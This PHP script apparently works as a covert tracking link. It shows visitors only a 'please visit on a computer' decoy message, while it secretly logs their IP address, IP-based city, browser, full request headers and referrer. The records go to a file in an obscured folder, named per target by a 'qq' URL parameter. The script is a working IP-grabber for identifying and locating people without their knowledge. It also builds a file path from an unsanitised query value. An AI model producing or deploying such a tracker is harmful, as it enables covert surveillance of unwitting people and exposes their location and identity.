<?php
date_default_timezone_set('PRC');
//$a = [
//    'k'=>1,
//    'kg'=>['sdf'=>'3512'],
//    'kgs'=>['sdf'=>'3512','sdfsaf'=>['sadfasf'=>5454]],
//    'ks'=>2,
//];
//echo array_to_string($a);
//exit;

//phpinfo();exit;
//die('541654');
include_once("get.class.php");
echo '<pre>请使用电脑访问！</pre>';
$info['link_tip'] = $_GET['qq']?:'alll';
$getClass = new visitorInfo();
$info['ip'] = $getClass->getIP2();
if ($info['ip']) {
    @$info['adders'] = $getClass->findCityByIp($info['ip'])['data'];
//    @$info['adders'] = $getClass->findCityByIp($info['ip']);
}
$info['browser'] = $getClass->getBrowser();
$info['header'] = $getClass->get_all_header();
$info['from'] = $getClass->getFromPage();
$info_string = array_to_string($info);
//print_r($info_string);
//exit;

$txt = "\n---------------------------\nTime ：" . date('Y-m-d H:i:s') . "\n" . $info_string . "---------------------------\n";

$myfile = fopen("./4ddd7ed2c916bfc81505aa14ca1dac57/".$info['link_tip']."Log.txt", "a+") or die("");

fwrite($myfile, $txt);

fclose($myfile);
die('');

function array_to_string($arr, $space_num = '')
{
    $in = "\n";
    $re = '';
    if (!is_array($arr)) {
        return $arr . $in;
    }
    foreach ($arr as $k => $v) {
        if (is_array($v)) {
            $re .= $space_num . $k . ' => ' . $in . array_to_string($v, $space_num . '--');
        } else {
            $re .= $space_num . $k . ' => ' . $v . $in;
        }
    }
    return $re;
}